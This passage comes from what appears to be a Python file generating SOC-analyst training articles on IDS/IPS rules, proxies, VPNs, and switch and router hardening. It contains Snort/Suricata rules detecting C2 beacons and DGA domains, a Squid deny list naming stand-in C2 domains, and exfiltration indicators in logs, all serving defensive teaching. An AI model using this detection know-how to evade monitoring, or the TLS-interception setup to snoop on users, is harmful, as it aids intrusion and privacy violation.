### Heuristic / Behavioral Detection

Uses rules about behavior patterns rather than exact signatures:

- Multiple failed logins followed by success (brute force)
- DNS queries for algorithmically generated domains (DGA detection)
- Encrypted traffic to newly registered domains
- Large outbound data transfers during off-hours

## NIDS vs HIDS

| Aspect | NIDS (Network) | HIDS (Host) |
|---|---|---|
| Monitors | Network traffic | Host files, logs, processes |
| Visibility | All network segments it sees | Single host, deep visibility |
| Encrypted Traffic | Cannot inspect (without TLS termination) | Sees decrypted content |
| Examples | Snort, Suricata, Zeek | OSSEC, Wazuh, osquery |
| Deployment | At network chokepoints | Agent on each host |
| Evasion | Fragmentation, encryption | Rootkits, agent tampering |

## Network Placement Strategies

```text
                Internet
                   |
              [ Firewall ]
                   |
        +----------+----------+
        |                     |
   [ NIDS/IPS ]          [ NIDS ]
   (inline, DMZ)      (passive, SPAN)
        |                     |
   [ DMZ Servers ]      [ Core Switch ]
                              |
                    +---------+---------+
                    |                   |
              [ User VLANs ]    [ Server VLANs ]
                    |                   |
               [ NIDS ]            [ NIDS ]
            (passive, SPAN)     (passive, SPAN)
```

### Placement Recommendations

| Location | Mode | Purpose |
|---|---|---|
| Between firewall and DMZ | Inline (IPS) | Block inbound attacks |
| Core switch SPAN port | Passive (IDS) | East-west visibility |
| Before critical server segments | Inline (IPS) | Protect high-value assets |
| Internet edge (outside firewall) | Passive (IDS) | See all attacks including blocked |
| Between network segments | Inline (IPS) | Prevent lateral movement |

## Snort Rule Syntax Overview

```text
action protocol src_ip src_port -> dst_ip dst_port (options)
```

### Rule Actions

| Action | Meaning |
|---|---|
| alert | Generate alert and log packet |
| log | Log packet only |
| pass | Ignore packet |
| drop | Block and log (IPS mode) |
| reject | Block, log, and send RST/ICMP unreachable |

### Key Rule Options

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"MALWARE Possible C2 beacon";       # Alert message
    flow:to_server,established;              # Direction and state
    content:"GET";                           # Match literal bytes
    http_method;                             # Content modifier
    content:"/update/check";                 # URI path match
    http_uri;                                # Content modifier
    content:"Mozilla/4.0";                   # User-agent match
    http_header;                             # Content modifier
    pcre:"/[a-f0-9]{32}/";                  # Regex match
    threshold:type limit,track by_src,count 1,seconds 300;
    classtype:trojan-activity;
    sid:2000001; rev:3;
)
```

## Suricata Rule Enhancements Over Snort

```text
# Suricata supports multi-threading and additional keywords
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ET MALWARE Suspected DGA domain";
    flow:established,to_server;
    http.host; content:".top";              # Suricata sticky buffer syntax
    pcre:"/^[a-z]{12,18}\.top$/";
    lua:dga_entropy_check.lua;              # Lua scripting support
    sid:3000001; rev:1;
)
```

## Tuning IDS/IPS for SOC Operations

### Common Tuning Steps

1. **Suppress noisy rules** that generate alerts with no security value
2. **Threshold** high-volume rules to limit alert counts
3. **Adjust variables** ($HOME_NET, $EXTERNAL_NET, $HTTP_SERVERS) accurately
4. **Disable rules** not relevant to your environment
5. **Create local rules** for organization-specific threats

### Suppression and Threshold Examples

```text
# Suppress rule for known scanner (Snort/Suricata)
suppress gen_id 1, sig_id 2000001, track by_src, ip 10.0.5.100

# Threshold: alert once per source IP every 60 seconds
threshold gen_id 1, sig_id 2000002, type limit, track by_src, count 1, seconds 60

# Event filter: only alert if 10+ events in 120 seconds
event_filter gen_id 1, sig_id 2000003, type threshold, track by_src, count 10, seconds 120
```

## IDS/IPS Alert Triage for SOC Analysts

### Priority Assessment Matrix

| Signature Class | Internal Target | External Target | Priority |
|---|---|---|---|
| attempted-admin | Critical server | N/A | P1 - Immediate |
| trojan-activity | Any internal host | C2 server | P1 - Immediate |
| web-application-attack | DMZ web server | N/A | P2 - High |
| attempted-recon | Multiple hosts | Single source | P3 - Medium |
| policy-violation | User workstation | Streaming site | P4 - Low |

### Triage Workflow

1. Check if the source/destination are legitimate assets
2. Verify the signature matched real malicious content (not a false positive)
3. Check if the attack was successful (response codes, follow-on traffic)
4. Correlate with endpoint telemetry and firewall logs
5. Check threat intelligence for the involved IPs/domains
6. Determine scope -- is this isolated or part of a campaign?

## Performance Considerations

| Factor | Impact | Mitigation |
|---|---|---|
| Bandwidth exceeds capacity | Dropped packets, missed detections | Use hardware acceleration, distribute load |
| Too many active rules | CPU saturation | Disable irrelevant rules, use targeted policies |
| Full packet capture enabled | Storage exhaustion | Capture headers only, or capture selectively |
| TLS encrypted traffic | Blind spots | Deploy TLS interception or use HIDS |

## Key Takeaways for SOC Analysts

- IDS gives you visibility without risk of blocking legitimate traffic
- IPS requires careful tuning before deploying inline to avoid outages
- Always validate alerts against the actual packet payload before escalating
- A well-tuned IDS with 50 rules beats an untuned IDS with 50,000 rules
- Correlate IDS/IPS alerts with other data sources for higher-confidence detections
"""
    ))

    # -------------------------------------------------------------------------
    # Article 3: Proxy Servers Forward and Reverse
    # -------------------------------------------------------------------------
    articles.append((
        "Proxy Servers Forward and Reverse",
        ["infrastructure", "proxy", "reverse-proxy", "ssl-inspection", "web-security"],
        r"""# Proxy Servers: Forward and Reverse

## Overview

Proxy servers act as intermediaries between clients and servers. Forward proxies handle
outbound requests from internal users; reverse proxies protect backend servers from
inbound traffic. Both are critical components in a defense-in-depth architecture.

## Forward vs Reverse Proxy

```text
Forward Proxy:
  [Internal User] --> [Forward Proxy] --> [Internet Server]
  User knows about the proxy; server sees proxy IP

Reverse Proxy:
  [External User] --> [Reverse Proxy] --> [Backend Server]
  User sees proxy IP; server knows about the proxy
```

| Feature | Forward Proxy | Reverse Proxy |
|---|---|---|
| Protects | Internal clients | Backend servers |
| Direction | Outbound traffic | Inbound traffic |
| Client Awareness | Client configured to use proxy | Transparent to client |
| Primary Purpose | Egress filtering, caching | Load balancing, WAF, SSL termination |
| Examples | Squid, Zscaler, BlueCoat | Nginx, HAProxy, F5, Cloudflare |
| SOC Use Case | Web filtering logs, C2 detection | Application attack detection |

## Forward Proxy for Egress Filtering

### Squid Proxy Configuration Example

```text
# /etc/squid/squid.conf

# Define internal network
acl internal_net src 10.0.0.0/8
acl internal_net src 172.16.0.0/12

# Define blocked categories
acl blocked_domains dstdomain .malware-domain.com
acl blocked_domains dstdomain .evil-c2-server.net
acl blocked_tlds dstdomain .xyz .top .tk .pw

# Define allowed ports
acl safe_ports port 80 443 8080 8443

# Block unsafe ports
http_access deny !safe_ports

# Block known malicious domains
http_access deny blocked_domains
http_access deny blocked_tlds

# Allow internal network
http_access allow internal_net

# Deny everything else
http_access deny all

# Logging
access_log /var/log/squid/access.log squid
```

### Forward Proxy Security Benefits

| Capability | Security Value |
|---|---|
| URL/domain filtering | Block known C2, phishing, malware sites |
| Content type filtering | Block executable downloads |
| SSL/TLS inspection | Detect encrypted C2 traffic |
| User authentication | Attribute web activity to users |
| Bandwidth control | Limit data exfiltration volume |
| Caching | Reduce attack surface via cached content |
| Logging | Complete web activity audit trail |

## Transparent vs Explicit Proxy

### Explicit Proxy

Client is configured to send requests to the proxy:

```text
# Browser/system proxy settings
HTTP Proxy:  proxy.corp.local:3128
HTTPS Proxy: proxy.corp.local:3128
No Proxy:    localhost,127.0.0.1,.corp.local,10.0.0.0/8

# Environment variables (Linux)
export http_proxy=http://proxy.corp.local:3128
export https_proxy=http://proxy.corp.local:3128

# PAC file auto-configuration
function FindProxyForURL(url, host) {
    if (isPlainHostName(host)) return "DIRECT";
    if (dnsDomainIs(host, ".corp.local")) return "DIRECT";
    return "PROXY proxy.corp.local:3128";
}
```

### Transparent Proxy

Network forces traffic through the proxy without client configuration:

```text
# iptables rule to redirect HTTP traffic to transparent proxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
    -j REDIRECT --to-port 3128

# Squid transparent mode
http_port 3128 intercept
```

| Mode | Advantages | Disadvantages |
|---|---|---|
| Explicit | Full protocol support, user auth | Requires client config, bypassable |
| Transparent | No client config needed | Limited HTTPS inspection, no user auth |

## SSL/TLS Inspection (MITM Proxy)

```text
[Client] --TLS--> [Proxy] --TLS--> [Server]
          cert A           cert B

Proxy decrypts with cert A (internal CA),
inspects content, re-encrypts with cert B (server's real cert).
Client trusts internal CA certificate.
```

### Implementation Requirements

1. Internal Certificate Authority (CA) trusted by all endpoints
2. CA certificate deployed via Group Policy or MDM
3. Exemption list for sensitive sites (banking, healthcare)
4. Compliance review (privacy laws may restrict inspection)
5. Performance sizing (TLS inspection is CPU-intensive)

### Squid SSL Bump Configuration

```text
# Generate CA certificate
openssl req -new -newkey rsa:2048 -days 365 -nodes \
    -x509 -keyout squid-ca-key.pem -out squid-ca-cert.pem

# Squid SSL bump config
http_port 3128 ssl-bump \
    cert=/etc/squid/squid-ca-cert.pem \
    key=/etc/squid/squid-ca-key.pem \
    generate-host-certificates=on

# Peek at SNI, then bump or splice
acl step1 at_step SslBump1
ssl_bump peek step1
ssl_bump bump all
```

## Reverse Proxy Configuration

### Nginx Reverse Proxy Example

```nginx
upstream backend_servers {
    server 10.0.2.10:8080 weight=3;
    server 10.0.2.11:8080 weight=2;
    server 10.0.2.12:8080 backup;
}

server {
    listen 443 ssl;
    server_name app.example.com;

    ssl_certificate     /etc/nginx/ssl/app.crt;
    ssl_certificate_key /etc/nginx/ssl/app.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";

    # Rate limiting
    limit_req zone=api burst=20 nodelay;

    # Proxy settings
    location / {
        proxy_pass http://backend_servers;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeouts
        proxy_connect_timeout 5s;
        proxy_read_timeout 30s;
    }
}
```

### Reverse Proxy Security Features

| Feature | Purpose |
|---|---|
| SSL termination | Offload TLS from backend servers |
| Request filtering | Block malicious URIs before they reach apps |
| Rate limiting | Prevent brute force and DoS |
| IP allowlisting | Restrict access to trusted sources |
| Header manipulation | Remove server version info, add security headers |
| Load balancing | Distribute traffic, provide failover |
| Caching | Reduce backend load, mitigate some DoS |

## Proxy Logs for SOC Analysis

### Key Fields in Proxy Logs

```text
# Squid access log format
timestamp  elapsed  client_ip  result_code/status  bytes  method  URL  user  hierarchy/peer  content_type
1708012345.678  234  10.0.1.50  TCP_MISS/200  15234  GET  https://example.com/page  jsmith  DIRECT/93.184.216.34  text/html
```

### Suspicious Proxy Log Patterns

| Pattern | Indicator |
|---|---|
| Long URLs with encoded payloads | Data exfiltration via GET parameters |
| Repeated POST to same external IP | C2 beaconing |
| CONNECT to non-standard ports | Tunneling attempt |
| High volume to newly registered domains | Possible DGA or phishing |
| Denied requests followed by direct connection | Proxy bypass attempt |
| User-agent inconsistencies | Malware using hardcoded user-agents |

## Key Takeaways for SOC Analysts

- Forward proxy logs are one of the richest data sources for detecting C2 and exfiltration
- SSL inspection creates both visibility and risk (privacy, certificate management)
- Reverse proxies add a defense layer but must be hardened themselves
- Always check for proxy bypass attempts in firewall logs (direct port 80/443 outbound)
- Correlate proxy logs with DNS logs to detect domain generation algorithms
"""
    ))

    # -------------------------------------------------------------------------
    # Article 4: VPN Technologies IPSec SSL TLS WireGuard
    # -------------------------------------------------------------------------
    articles.append((
        "VPN Technologies IPSec SSL TLS WireGuard",
        ["infrastructure", "vpn", "ipsec", "wireguard", "ssl-vpn", "remote-access"],
        r"""# VPN Technologies: IPSec, SSL/TLS, and WireGuard

## Overview

Virtual Private Networks (VPN) create encrypted tunnels across untrusted networks. SOC
analysts must understand VPN technologies to monitor for misuse, investigate connection
anomalies, and assess the security posture of remote access solutions.

## VPN Types

| Type | Use Case | Protocol | Port |
|---|---|---|---|
| Site-to-Site IPSec | Connect branch offices | IKE + ESP | UDP 500, 4500; IP proto 50 |
| Remote Access IPSec | Individual user VPN | IKEv2 + ESP | UDP 500, 4500 |
| SSL/TLS VPN | Browser or client-based remote access | TLS | TCP 443 |
| WireGuard | Modern lightweight VPN | WireGuard | UDP 51820 |
| GRE over IPSec | Multicast/routing over VPN | GRE + IPSec | IP proto 47 + IPSec |

## IPSec Architecture

IPSec operates in two phases to establish a secure tunnel.

### IKE Phase 1 (Main Mode or Aggressive Mode)

Establishes a secure, authenticated channel between peers.

```text
Initiator                          Responder
    |--- SA proposal (algorithms) --->|
    |<-- SA accepted ------------------|
    |--- Key exchange (DH) ---------->|
    |<-- Key exchange (DH) -----------|
    |--- Authentication (identity) -->|
    |<-- Authentication (identity) ---|

Result: IKE Security Association (bidirectional)
```

| Parameter | Options | Recommendation |
|---|---|---|
| Encryption | AES-128, AES-256, 3DES | AES-256 |
| Hash | SHA-256, SHA-384, SHA-512, MD5 | SHA-256 minimum |
| DH Group | 2 (1024-bit), 14 (2048), 19 (ECC 256) | Group 14+ or 19+ |
| Authentication | Pre-shared key, RSA certificates | Certificates for production |
| Lifetime | 86400s (24 hours) typical | 28800s (8 hours) recommended |

### IKE Phase 2 (Quick Mode)

Negotiates the IPSec SA for actual data encryption.

```text
Parameters negotiated:
- ESP or AH protocol
- Encryption algorithm (AES-256-GCM recommended)
- Integrity algorithm (SHA-256 minimum)
- IPSec SA lifetime (3600s typical)
- PFS (Perfect Forward Secrecy) DH group
```

### ESP vs AH

| Feature | ESP (Encapsulating Security Payload) | AH (Authentication Header) |
|---|---|---|
| Encryption | Yes | No |
| Integrity | Yes | Yes |
| IP Header Authentication | No (outer header) | Yes (including IP header) |
| NAT Compatible | Yes (with NAT-T) | No |
| Protocol Number | 50 | 51 |
| Common Use | Standard choice | Rarely used today |

### IPSec Tunnel vs Transport Mode

```text
Tunnel Mode (site-to-site):
[New IP Header][ESP Header][Original IP Header][Original Payload][ESP Trailer]
  -- Entire original packet is encrypted --

Transport Mode (host-to-host):
[Original IP Header][ESP Header][Original Payload][ESP Trailer]
  -- Only payload is encrypted, original IP header preserved --
```

## SSL/TLS VPN

SSL VPNs use TLS to create encrypted tunnels, typically over TCP 443, making them
firewall-friendly.

### Types of SSL VPN

| Type | Description | Example |
|---|---|---|
| Clientless (Portal) | Browser-based access to web apps | Citrix, F5 portal |
| Thin Client | Browser plugin for specific protocols | Java/ActiveX based |
| Full Tunnel | VPN client creates full network tunnel | AnyConnect, GlobalProtect |

### Cisco AnyConnect Profile Example

```xml
<AnyConnectProfile>
  <ServerList>
    <HostEntry>
      <HostName>Corporate VPN</HostName>
      <HostAddress>vpn.corp.example.com</HostAddress>
    </HostEntry>
  </ServerList>
  <ClientInitialization>
    <UseStartBeforeLogon>false</UseStartBeforeLogon>
    <StrictCertificateTrust>true</StrictCertificateTrust>
    <RestrictPreferenceCaching>Credentials</RestrictPreferenceCaching>
    <AutomaticCertSelection>true</AutomaticCertSelection>
  </ClientInitialization>
</AnyConnectProfile>
```

## WireGuard

WireGuard is a modern VPN protocol with a minimal codebase (~4,000 lines of code
vs 100,000+ for OpenVPN) and strong cryptographic choices.

### WireGuard Configuration

```ini
# Server configuration (/etc/wireguard/wg0.conf)
[Interface]
PrivateKey = SERVER_PRIVATE_KEY_HERE
Address = 10.100.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Peer: Remote worker laptop
[Peer]
PublicKey = CLIENT_PUBLIC_KEY_HERE
AllowedIPs = 10.100.0.2/32
PersistentKeepalive = 25

# Client configuration
[Interface]
PrivateKey = CLIENT_PRIVATE_KEY_HERE
Address = 10.100.0.2/24
DNS = 10.0.0.53

[Peer]
PublicKey = SERVER_PUBLIC_KEY_HERE
Endpoint = vpn.corp.example.com:51820
AllowedIPs = 10.0.0.0/8, 172.16.0.0/12
PersistentKeepalive = 25
```

### WireGuard Cryptographic Primitives

| Function | Algorithm | Notes |
|---|---|---|
| Key Exchange | Curve25519 | Elliptic curve DH |
| Encryption | ChaCha20 | Stream cipher |
| Authentication | Poly1305 | MAC |
| Hashing | BLAKE2s | Fast, secure hash |
| Key Derivation | HKDF | Derives session keys |

## Split Tunnel vs Full Tunnel

```text
Full Tunnel:
  ALL traffic --> [VPN Tunnel] --> Corporate Network --> Internet
  Pros: Full visibility, consistent policy enforcement
  Cons: Higher bandwidth, latency for internet traffic

Split Tunnel:
  Corporate traffic --> [VPN Tunnel] --> Corporate Network
  Internet traffic  --> [Direct Internet]
  Pros: Better performance, lower VPN bandwidth
  Cons: Reduced visibility, endpoint exposed to internet threats
```

| Consideration | Full Tunnel | Split Tunnel |
|---|---|---|
| Security Visibility | Complete | Partial |
| User Experience | Slower internet | Better performance |
| Bandwidth Cost | Higher | Lower |
| Policy Enforcement | Consistent | Only for tunneled traffic |
| Data Exfiltration Risk | Lower (all traffic inspected) | Higher (direct internet) |

## VPN Security Monitoring

### Key Indicators for SOC Analysts

| Indicator | Concern |
|---|---|
| VPN login from unusual geolocation | Compromised credentials |
| Multiple concurrent sessions same user | Credential sharing or compromise |
| VPN connection at unusual hours | Possible unauthorized access |
| Massive data transfer over VPN | Data exfiltration |
| VPN login followed by lateral movement | Post-exploitation activity |
| Failed VPN auth attempts (brute force) | Credential attack |
| VPN from Tor exit node or known proxy | Evasion attempt |

### VPN Log Fields to Monitor

```text
Timestamp | User | Source_IP | Assigned_IP | Duration | Bytes_In | Bytes_Out | Auth_Method | Disconnect_Reason
2026-02-15 08:15:00 | jsmith | 203.0.113.50 | 10.100.0.25 | 8h32m | 1.2GB | 450MB | Certificate+MFA | User initiated
2026-02-15 03:42:00 | jsmith | 198.51.100.9 | 10.100.0.26 | 0h15m | 8.5GB | 12MB | Password only | Timeout
```

The second entry is suspicious: unusual time, different source IP, massive download,
password-only authentication (no MFA), and short session with high data transfer.

## Key Takeaways for SOC Analysts

- Monitor for impossible travel (VPN logins from geographically distant locations in short timeframes)
- WireGuard is increasingly common; ensure monitoring covers UDP 51820
- Split tunnel configurations create blind spots for network-based detection
- VPN credentials are high-value targets; always look for brute force patterns
- Check for VPN configurations that fall back to weak encryption (downgrade attacks)
"""
    ))

    # -------------------------------------------------------------------------
    # Article 5: Switches Managed vs Unmanaged Layer 2 vs Layer 3
    # -------------------------------------------------------------------------
    articles.append((
        "Switches Managed vs Unmanaged Layer 2 vs Layer 3",
        ["infrastructure", "switches", "vlans", "port-security", "layer2", "layer3"],
        r"""# Switches: Managed vs Unmanaged, Layer 2 vs Layer 3

## Overview

Switches form the backbone of every LAN. For SOC analysts, understanding switch features
is critical because many attacks -- ARP spoofing, VLAN hopping, MAC flooding, DHCP
starvation -- exploit switch behavior. Managed switches provide the security controls
needed to detect and prevent these attacks.

## Managed vs Unmanaged Switches

| Feature | Unmanaged | Managed |
|---|---|---|
| Configuration | None (plug and play) | Full CLI/GUI configuration |
| VLANs | No | Yes |
| Port Security | No | Yes |
| ACLs | No | Yes |
| SNMP Monitoring | No | Yes |
| Spanning Tree Control | No | Yes |
| DHCP Snooping | No | Yes |
| 802.1X Authentication | No | Yes |
| Logging | No | Yes (syslog) |
| Cost | Low | Higher |
| SOC Visibility | None | Full |

**SOC recommendation:** Never deploy unmanaged switches in production. Without logging
and security features, they are invisible to monitoring and vulnerable to layer 2 attacks.

## Layer 2 vs Layer 3 Switching

| Capability | Layer 2 Switch | Layer 3 Switch |
|---|---|---|
| MAC Address Table | Yes | Yes |
| VLAN Support | Yes | Yes |
| IP Routing | No | Yes (inter-VLAN routing) |
| ACLs | Port-based only | Port and IP-based |
| Routing Protocols | No | OSPF, EIGRP, BGP |
| Typical Placement | Access layer | Distribution/core layer |

### Layer 3 Switch Inter-VLAN Routing

```text
# Cisco IOS Layer 3 switch configuration
ip routing

interface Vlan10
 description User-VLAN
 ip address 10.0.10.1 255.255.255.0
 no shutdown

interface Vlan20
 description Server-VLAN
 ip address 10.0.20.1 255.255.255.0
 no shutdown

interface Vlan99
 description Management-VLAN
 ip address 10.0.99.1 255.255.255.0
 no shutdown

! ACL: Users can reach servers on HTTPS only
ip access-list extended USERS-TO-SERVERS
 permit tcp 10.0.10.0 0.0.0.255 10.0.20.0 0.0.0.255 eq 443
 permit icmp 10.0.10.0 0.0.0.255 10.0.20.0 0.0.0.255 echo
 deny ip any any log

interface Vlan10
 ip access-group USERS-TO-SERVERS out
```

## VLAN Configuration and Security

### VLAN Setup

```text
! Create VLANs
vlan 10
 name Users
vlan 20
 name Servers
vlan 30
 name Guest
vlan 99
 name Management
vlan 999
 name Parking

! Assign access ports
interface GigabitEthernet0/1
 description User-Workstation
 switchport mode access
 switchport access vlan 10
 spanning-tree portfast

! Configure trunk port
interface GigabitEthernet0/48
 description Uplink-to-Core
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,99
 switchport trunk native vlan 999
 switchport nonegotiate
```

### VLAN Hopping Prevention

| Attack | Mitigation | Configuration |
|---|---|---|
| Switch spoofing | Disable DTP on all ports | `switchport nonegotiate` |
| Double tagging | Change native VLAN to unused VLAN | `switchport trunk native vlan 999` |
| Double tagging | Tag native VLAN on trunks | `vlan dot1q tag native` |
| Unauth VLAN access | Restrict allowed VLANs on trunks | `switchport trunk allowed vlan 10,20` |

## Port Security

Port security limits the number of MAC addresses allowed on a port and defines
the action when violations occur.

```text
interface GigabitEthernet0/1
 switchport mode access
 switchport access vlan 10
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
 switchport port-security aging time 60
 switchport port-security aging type inactivity
```

### Violation Modes

| Mode | Action on Violation | Port Status | Syslog | Counter |
|---|---|---|---|---|
| Protect | Drops violating frames | Up | No | No |
| Restrict | Drops violating frames | Up | Yes | Yes |
| Shutdown | Disables port (err-disabled) | Down | Yes | Yes |

### Monitoring Port Security

```text
# Show port security status
show port-security interface Gi0/1

Port Security              : Enabled
Port Status                : Secure-up
Violation Mode             : Restrict
Maximum MAC Addresses      : 2
Total MAC Addresses        : 1
Sticky MAC Addresses       : 1
Last Source Address:Vlan    : aa:bb:cc:dd:ee:ff:10
Security Violation Count   : 3
```

## DHCP Snooping

DHCP snooping prevents rogue DHCP servers and is a prerequisite for Dynamic ARP
Inspection (DAI).

```text
! Enable DHCP snooping globally
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! Trust the uplink port (where legitimate DHCP server responds)
interface GigabitEthernet0/48
 ip dhcp snooping trust

! Rate-limit DHCP on access ports (prevent starvation)
interface range GigabitEthernet0/1 - 24
 ip dhcp snooping limit rate 10
```

### DHCP Snooping Binding Table

```text
show ip dhcp snooping binding

MacAddress         IpAddress       Lease(sec)  Type          VLAN  Interface
aa:bb:cc:dd:ee:ff  10.0.10.50      86400       dhcp-snooping 10    Gi0/1
11:22:33:44:55:66  10.0.10.51      86400       dhcp-snooping 10    Gi0/2
```

## Dynamic ARP Inspection (DAI)

DAI validates ARP packets against the DHCP snooping binding table, preventing
ARP spoofing attacks.

```text
! Enable DAI on VLANs
ip arp inspection vlan 10,20,30

! Trust uplink ports
interface GigabitEthernet0/48
 ip arp inspection trust

! Rate-limit ARP on access ports
interface range GigabitEthernet0/1 - 24
 ip arp inspection limit rate 15 burst interval 1
```

## Switch Hardening Checklist

```text
1. Disable unused ports and assign to parking VLAN (vlan 999)
   interface range Gi0/25 - 47
    switchport access vlan 999
    shutdown

2. Enable port security on all access ports
3. Enable DHCP snooping and DAI
4. Disable DTP (switchport nonegotiate) on all ports
5. Set native VLAN to unused VLAN on trunks
6. Enable BPDU guard on access ports
   spanning-tree bpduguard enable

7. Enable root guard on designated ports
   spanning-tree guard root

8. Restrict management access
   line vty 0 15
    access-class MGMT-ACL in
    transport input ssh

9. Enable logging
   logging host 10.0.99.50
   logging trap informational

10. Disable unnecessary services
    no ip http server
    no cdp run  (on access ports)
```

## Layer 2 Attack Detection for SOC Analysts

| Attack | Log Indicator | Switch Feature |
|---|---|---|
| MAC flooding | Port security violations, high MAC count | Port security |
| ARP spoofing | DAI violation logs | Dynamic ARP Inspection |
| Rogue DHCP | DHCP snooping drops on untrusted port | DHCP snooping |
| VLAN hopping | DTP negotiation on access port | DTP disabled |
| STP manipulation | BPDU received on access port | BPDU guard |
| Unauthorized device | 802.1X auth failure | 802.1X |

## Key Takeaways for SOC Analysts

- Layer 2 attacks are often invisible to network IDS -- switch logs are essential
- MAC flooding attacks cause switches to fail-open (hub mode), exposing all traffic
- ARP spoofing enables man-in-the-middle attacks within a VLAN
- Always verify that DHCP snooping, DAI, and port security are enabled on access switches
- Switch log correlation with other sources helps identify lateral movement
"""
    ))

    # -------------------------------------------------------------------------
    # Article 6: Router Security and Hardening
    # -------------------------------------------------------------------------
    articles.append((
        "Router Security and Hardening",
        ["infrastructure", "routers", "acl", "routing", "hardening", "network-security"],
        r"""# Router Security and Hardening

## Overview

Routers direct traffic between networks and are prime targets for attackers seeking
to intercept, redirect, or disrupt communications. Compromised routers give attackers
a privileged position for man-in-the-middle attacks, traffic redirection, and network
reconnaissance. SOC analysts must understand router security to detect compromise
indicators and validate hardening configurations.

## Router Security Architecture

```text
Three Planes of Router Operation:

+-------------------+
| Management Plane  |  SSH, SNMP, NTP, syslog, AAA
+-------------------+
| Control Plane     |  Routing protocols (OSPF, BGP), ARP, ICMP
+-------------------+
| Data Plane        |  User traffic forwarding, ACLs, QoS
+-------------------+
```

## Access Control Lists (ACLs)

### Standard ACLs (Filter by Source IP Only)

```text
! Standard ACL - placed close to destination
access-list 10 permit 10.0.10.0 0.0.0.255
access-list 10 permit 10.0.20.0 0.0.0.255
access-list 10 deny any log

interface GigabitEthernet0/1
 ip access-group 10 in
```

### Extended ACLs (Filter by Source, Destination, Protocol, Port)

```text
! Extended ACL - placed close to source
ip access-list extended OUTBOUND-FILTER
 ! Allow DNS to corporate DNS servers only
 permit udp 10.0.0.0 0.0.255.255 host 10.0.1.53 eq 53
 permit tcp 10.0.0.0 0.0.255.255 host 10.0.1.53 eq 53
 ! Allow HTTPS outbound
 permit tcp 10.0.0.0 0.0.255.255 any eq 443
 ! Allow established TCP return traffic
 permit tcp any 10.0.0.0 0.0.255.255 established
 ! Block RFC 1918 addresses going outbound (anti-spoofing)
 deny ip 10.0.0.0 0.255.255.255 any log
 deny ip 172.16.0.0 0.15.255.255 any log
 deny ip 192.168.0.0 0.0.255.255 any log
 ! Block everything else
 deny ip any any log

interface GigabitEthernet0/0
 ip access-group OUTBOUND-FILTER out
```

### Named ACLs for Management Access

```text
ip access-list standard VTY-ACCESS
 permit 10.0.99.0 0.0.0.255
 deny any log

line vty 0 15
 access-class VTY-ACCESS in
 transport input ssh
 exec-timeout 10 0
 login local
```

## Anti-Spoofing with Unicast RPF

Unicast Reverse Path Forwarding (uRPF) drops packets with source addresses that
do not have a valid return route through the receiving interface.

```text
! Strict mode - source IP must be reachable via receiving interface
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

! Loose mode - source IP must exist in routing table (any interface)
interface GigabitEthernet0/1
 ip verify unicast source reachable-via any
```

| Mode | Use Case | Drops |
|---|---|---|
| Strict | Single-homed interfaces | Packets with unreachable source via that interface |
| Loose | Multi-homed or asymmetric routing | Packets with no route to source at all |

## Control Plane Protection

### Control Plane Policing (CoPP)

Rate-limit traffic destined to the router itself to prevent DoS:

```text
! Define traffic classes
ip access-list extended ROUTING-PROTOCOLS
 permit ospf any any
 permit tcp any any eq 179  ! BGP

ip access-list extended MANAGEMENT
 permit tcp 10.0.99.0 0.0.0.255 any eq 22  ! SSH
 permit udp 10.0.99.0 0.0.0.255 any eq 161 ! SNMP

ip access-list extended ICMP-TRAFFIC
 permit icmp any any

! Class maps
class-map match-all CM-ROUTING
 match access-group name ROUTING-PROTOCOLS
class-map match-all CM-MANAGEMENT
 match access-group name MANAGEMENT
class-map match-all CM-ICMP
 match access-group name ICMP-TRAFFIC

! Policy map with rate limits
policy-map PM-COPP
 class CM-ROUTING
  police 500000 conform-action transmit exceed-action drop
 class CM-MANAGEMENT
  police 100000 conform-action transmit exceed-action drop
 class CM-ICMP
  police 64000 conform-action transmit exceed-action drop
 class class-default
  police 32000 conform-action drop exceed-action drop

! Apply to control plane
control-plane
 service-policy input PM-COPP
```

## Management Plane Security

### SSH Configuration

```text
! Generate RSA key pair
crypto key generate rsa modulus 2048

! SSH version 2 only
ip ssh version 2
ip ssh time-out 60
ip ssh authentication-retries 3

! Disable Telnet, HTTP
no ip http server
no ip http secure-server
line vty 0 15
 transport input ssh
 transport output ssh
```

### AAA Configuration

```text
aaa new-model
aaa authentication login default local
aaa authorization exec default local
aaa accounting exec default start-stop group tacacs+
aaa accounting commands 15 default start-stop group tacacs+

! Local admin account with strong password
username admin privilege 15 algorithm-type scrypt secret STRONG_PASSWORD_HERE
```

### SNMP Hardening

```text
! Disable SNMP v1/v2c if possible
no snmp-server community public
no snmp-server community private

! SNMPv3 with authentication and encryption
snmp-server group MONITOR-GROUP v3 priv
snmp-server user monitor-user MONITOR-GROUP v3 \
  auth sha AUTH_PASSWORD priv aes 256 PRIV_PASSWORD

! Restrict SNMP access
snmp-server host 10.0.99.50 version 3 priv monitor-user
ip access-list standard SNMP-ACCESS
 permit 10.0.99.0 0.0.0.255
snmp-server community READONLY ro SNMP-ACCESS
```

## Logging Configuration

```text
! Enable timestamps
service timestamps log datetime msec localtime show-timezone
service timestamps debug datetime msec localtime show-timezone

! Console and buffer logging
logging console warnings
logging buffered 32768 informational

! Remote syslog
logging host 10.0.99.50 transport udp port 514
logging facility local6
logging trap informational
logging source-interface Loopback0

! Log ACL hits
ip access-list extended SAMPLE-ACL
 deny ip any any log-input  ! log-input includes interface and MAC
```

## Route Filtering and Security

